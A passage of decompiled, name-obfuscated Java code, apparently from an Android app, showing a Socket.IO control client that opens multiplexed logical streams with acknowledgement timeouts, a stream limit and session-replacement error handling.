                                e();
                                if (b1Var != null) {
                                    b1Var.a(new IOException("control session replaced"));
                                }
                                m();
                                g.j jVar2 = this.f1508d;
                                if (jVar2 != null) {
                                    ((cf) jVar2.f1415d).f3702f.execute(new f2.g(jVar2, jVar2.f1413b, eVarZ, 5));
                                }
                            }
                        } catch (Throwable th) {
                            throw th;
                        }
                    }
                } catch (IOException unused3) {
                    Log.w("SocketControlClient", "invalid device:registered payload");
                }
            }
        }
    }

    public final d0 w() throws IOException {
        d0 d0Var;
        h2.e eVar;
        final b1 b1Var = (b1) this.Q.get();
        final h2.e eVar2 = (h2.e) this.N.get();
        if (!this.f1528s.get() || !this.f1514g.f3425b || b1Var == null || eVar2 == null) {
            o2.l("Socket.IO control session unavailable");
            return null;
        }
        if (!b1.e(255)) {
            o2.l("unsupported logical stream channel");
            return null;
        }
        String string = UUID.randomUUID().toString();
        synchronized (b1Var.f1545a) {
            if (b1Var.f1550f) {
                throw new IOException("control session is closed");
            }
            if (b1Var.f1546b.size() >= 128) {
                throw new IOException("logical stream limit reached");
            }
            d0Var = new d0(b1Var, string, 255, b1Var.f1548d);
            b1Var.f1546b.put(string, d0Var);
        }
        try {
            final y.e eVar3 = new y.e(b1.g(string, b1Var.f1548d).put("channel", 255), d0Var);
            final CountDownLatch countDownLatch = new CountDownLatch(1);
            final AtomicReference atomicReference = new AtomicReference();
            try {
                P("stream_open", new u() { // from class: g2.f
                    @Override // g2.u
                    public final void run() throws IOException {
                        final a0 a0Var = this.f1590c;
                        final b1 b1Var2 = b1Var;
                        h2.e eVar4 = eVar2;
                        final y.e eVar5 = eVar3;
                        final AtomicReference atomicReference2 = atomicReference;
                        final CountDownLatch countDownLatch2 = countDownLatch;
                        h2.e eVar6 = (h2.e) a0Var.N.get();
                        if (a0Var.f1528s.get() && a0Var.f1514g.f3425b && a0Var.Q.get() == b1Var2 && eVar6 != null && eVar6.f1982d == eVar4.f1982d) {
                            a0Var.f1514g.a("stream:open", (JSONObject) eVar5.f5976c, new w0.a() { // from class: g2.r
                                @Override // w0.a
                                public final void a(Object[] objArr) {
                                    try {
                                        b1Var2.n(eVar5, a0.l(objArr));
                                        e = null;
                                    } catch (IOException e3) {
                                        e = e3;
                                    }
                                    atomicReference2.set(e);
                                    if (e == null) {
                                        a0 a0Var2 = a0Var;
                                        a0Var2.t();
                                        a0Var2.r();
                                    }
                                    countDownLatch2.countDown();
                                }
                            });
                        } else {
                            ((d0) eVar5.f5977d).d(new IOException("Socket.IO control session unavailable"), false);
                            o2.l("Socket.IO control session unavailable");
                        }
                    }
                });
                long jNanoTime = System.nanoTime() + 15000000000L;
                do {
                    long jNanoTime2 = jNanoTime - System.nanoTime();
                    if (jNanoTime2 <= 0) {
                        IOException iOException = new IOException("Socket.IO logical stream open ACK timeout");
                        ((d0) eVar3.f5977d).d(iOException, true);
                        throw iOException;
                    }
                    try {
                        if (countDownLatch.await(Math.min(jNanoTime2, 250000000L), TimeUnit.NANOSECONDS)) {
                            IOException iOException2 = (IOException) atomicReference.get();
                            if (iOException2 != null) {
                                ((d0) eVar3.f5977d).d(iOException2, true);
                                throw iOException2;
                            }
                            if (this.Q.get() == b1Var) {
                                return (d0) eVar3.f5977d;
                            }
                            IOException iOException3 = new IOException("Socket.IO control session replaced");
                            ((d0) eVar3.f5977d).d(iOException3, false);
                            throw iOException3;
                        }
                        eVar = (h2.e) this.N.get();
                        if (!this.f1528s.get() || !this.f1514g.f3425b || this.Q.get() != b1Var || eVar == null) {
                            break;
                        }
                    } catch (InterruptedException e3) {
                        Thread.currentThread().interrupt();
                        IOException iOException4 = new IOException("interrupted while opening Socket.IO logical stream", e3);
                        ((d0) eVar3.f5977d).d(iOException4, true);
                        throw iOException4;
                    }
                } while (eVar.f1982d == eVar2.f1982d);
                IOException iOException5 = new IOException("Socket.IO control session replaced");
                ((d0) eVar3.f5977d).d(iOException5, false);
                throw iOException5;
            } catch (RuntimeException e4) {
                IOException iOException6 = new IOException("Socket.IO logical stream open emit failed", e4);
                ((d0) eVar3.f5977d).d(iOException6, false);
                throw iOException6;
            }
        } catch (JSONException e5) {
            d0Var.d(new IOException("logical stream metadata failed", e5), false);
            throw new IOException("logical stream metadata failed", e5);
        }
    }
}
